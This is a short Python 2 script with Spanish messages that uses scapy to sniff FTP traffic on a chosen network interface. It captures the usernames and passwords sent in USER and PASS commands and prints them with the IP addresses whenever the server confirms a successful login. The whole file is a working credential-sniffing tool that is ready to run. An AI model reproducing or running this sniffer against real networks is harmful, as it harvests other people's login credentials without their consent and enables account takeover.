#!/usr/bin/env python
from scapy.all import *
import sys
interface=raw_input('Introduce la interface por la que debe escuchar: ')
logins=['null']
passwords=['null']
def correct_login(pkt,username,password):
    try:
        if '230' in pkt[Raw].load:
            print '\nCredenciales encontradas'
            print str(pkt[IP].dst.strip())+' ---->'+str(pkt[IP].src.strip())+' :'
            print '\t username: '+ username
            print '\t password: '+ password
            return
        else:
            return
    except Exception:
        return
    
def pkt_ftp(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        if pkt[TCP].sport == 21 or pkt[TCP].dport == 21:
            return True
        else:
            return False
    else:
        return False
    
def main(pkt):
    if pkt_ftp(pkt):
        pass
    else:
        return
    data=pkt[Raw].load
    if 'USER ' in data:
        logins.append(data.split('USER ')[1].strip())
    elif 'PASS ' in data:
        passwords.append(data.split('PASS ')[1].strip())
    else:
        correct_login(pkt,logins[-1],passwords[-1])
        return
print 'Sniffing empezado...'
try:
    sniff(iface=interface,prn=main,store=0)
except Exception:
    print 'Error'
    sys.exit(1)
print '\nSniffing parado'
                      
